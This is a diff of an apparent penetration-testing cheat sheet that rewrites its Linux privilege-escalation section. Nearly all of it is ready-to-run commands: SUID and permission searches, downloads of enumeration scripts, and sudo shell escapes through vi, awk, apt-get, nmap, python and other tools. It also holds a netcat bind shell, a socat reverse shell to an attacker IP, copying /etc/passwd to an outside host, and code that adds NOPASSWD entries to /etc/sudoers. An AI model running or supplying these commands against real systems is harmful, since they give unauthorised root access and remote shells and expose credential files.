@@ -225,49 +225,72 @@ curl ifconfig.me                                Show external IP when NAT-ed
 
 # Privilege Escalation
 
-- Enumeration scripts
-enum4linux -a <target IP>                       wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
-linenum.sh                                      wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-linuxprivchecker.py                             wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
-lse.sh                                          wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
-lynis audit system                              wget https://downloads.cisofy.com/lynis/lynis-2.7.5.tar.gz
+- Enumeration
+cat /etc/issue                                             OS info
+uname -a                                                   Kernel info
+uname -r                                                   Kernel version
+arch                                                       Architecture
+
+- Search for exploits
+searchsploit linux kernel ubuntu 16.04
+
+- Check for bad permissions
+find / -perm -4000 2>/dev/null                             Binaries with the SUID bit set - run the file with permissions of its owner
+find / -user root -perm -6000 -print 2>/dev/null           Binaries with the SGID bit set - run the file with permissions of the owner's group
+find / -perm -1000 2>/dev/null                             Binaries with the sticky bit set - only the owner of a directory or a file can delete or rename
+
+find / -perm -o+w -type f 2>/dev/null                      World-writeable files
+find / -writable -type d 2>/dev/null                       World-writeable folders
+
+find / -perm -o+x -type f 2>/dev/null                      World-executable files
+find / -perm -o+x -type d 2>/dev/null                      World-executable folders
+find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null     World-writeable & world-executable folders
+
+- Enumeration scripts (suggested order)
+wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+wget https://raw.githubusercontent.com/portcullislabs/enum4linux/master/enum4linux.pl
+wget https://downloads.cisofy.com/lynis/lynis-3.0.4.tar.gz     cd lynis; ./lynis audit system
 
 - sudoers
-sudo -l                                         Check for users with root permissions and binaries that can be ran with root privs
-sudo su or sudo bash                            If the current user is listed in the file, elevate privs to root
+sudo -l                                                    Users with root permissions and binaries that can be ran with root privs
+sudo su or sudo bash                                       If the current user is listed in the file, elevate privs to root
 
 - Abusing binaries
-sudo apache2 -f /etc/shadow                     A way to view a system file
+sudo apache2 -f /etc/shadow                                A way to view a system file
 sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash -i"
 sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
-sudo apt-get changelog apt                      !/bin/sh then hit enter
+sudo apt-get changelog apt                                 !/bin/sh then hit enter
 sudo awk 'BEGIN {system("/bin/bash")}'
-sudo ed                                         !/bin/sh then hit enter
+sudo ed                                                    !/bin/sh then hit enter
 sudo env /bin/bash
 sudo find /home -exec /bin/bash \;
-sudo git help add                               !/bin/sh then hit enter
+sudo git help add                                          !/bin/sh then hit enter
 touch tmp
-find tmp -exec whoami \;                        Find a file then execute a command
+find tmp -exec whoami \;                                   Find a file then execute a command
 find tmp -exec netcat -lvp 443 -e /bin/sh \;
 
 sudo ftp
 ! /bin/bash
 
-sudo less /etc/passwd                           !/bin/sh then hit enter
-sudo man man                                    !/bin/sh then hit enter
-sudo more /etc/passwd                           !/bin/sh then hit enter
+sudo less /etc/passwd                                      !/bin/sh then hit enter
+sudo man man                                               !/bin/sh then hit enter
+sudo more /etc/passwd                                      !/bin/sh then hit enter
 echo "os.execute('/bin/bash')" > test.nse && sudo nmap --script=test.nse
 sudo perl -e 'exec "/bin/bash";'
 sudo python -c 'import pty;pty.spawn("/bin/bash")'
 sudo scp /etc/passwd lee@10.0.0.5:~/
 
-socate file:`tty`,raw,echo=0 tcp-listen:443     Attack VM
+socate file:`tty`,raw,echo=0 tcp-listen:443                Attack VM
 sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:<attack IP>:443
 
-sudo vi                                         :!bash
-sudo vi                                         !/bin/sh then hit enter
-sudo vi                                         :set shell=/bin/bash:shell
-sudo vi                                         :shell
+sudo vi                                                    :!bash
+sudo vi                                                    !/bin/sh then hit enter
+sudo vi                                                    :set shell=/bin/bash:shell
+sudo vi                                                    :shell
 
 - Abusing the PATH variable
 After escaping a restricted shell, export “/bin/bash” as a SHELL environment variable
@@ -283,29 +306,6 @@ try:
     os.system('echo "lee ALL= (root) NOPASSWD: /usr/bin/apach2, /usr/bin/awk, /usr/bin/find" >> /etc/sudoers')
 except:
     sys.exit()
-
-- Check for binaries with the SUID, SGID and sticky bit set
-find / -perm -4000 2>/dev/null                  SUID - run the file with permissions of its owner
-find / -user root -perm -6000 -print 2>/dev/null     SGID - run the file with permissions of the owner's group
-find / -perm -1000 2>/dev/null                  sticky - only the owner of a directory or a file can delete or rename
-
-- Check for world-writable files and folders
-find / -perm -o+w -type f 2>/dev/null           World-writeable files
-find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print    World-writeable files
-
-find / -writable -type d 2>/dev/null            World-writeable folders
-find / -perm -222 -type d 2>/dev/null           World-writeable folders
-find / -perm -o+w -type d 2>/dev/null           World-writeable folders
-
-- Check for world-execuable files and folders
-find / -perm -o+x -type f 2>/dev/null           World-executable files
-find / -perm -o+x -type d 2>/dev/null           World-executable folders
-
-- Check for world-writeable & world-executable folders
-find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null
-
-- Check for files owned by no owner
-find /dir -xdev \( -nouser -o -nogroup \) -print
 
 - Cron jobs
 crontab -l                                      Check for entries
@@ -548,7 +548,6 @@ date                                            Date and time
 df -h                                           Disk usage
 du                                              Directory space usage
 env                                             Environmental variables
-/etc/issue                                      OS info
 fdisk -l                                        Partition table
 finger <user>                                   Info about a user
 free                                            Memory and swap usage
@@ -557,7 +556,6 @@ halt                                            Power off
 /proc/meminfo                                   Memory info
 reboot                                          Reboot
 set                                             Environmental variables
-uname -a                                        Kernel info
 uptime                                          Current uptime
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
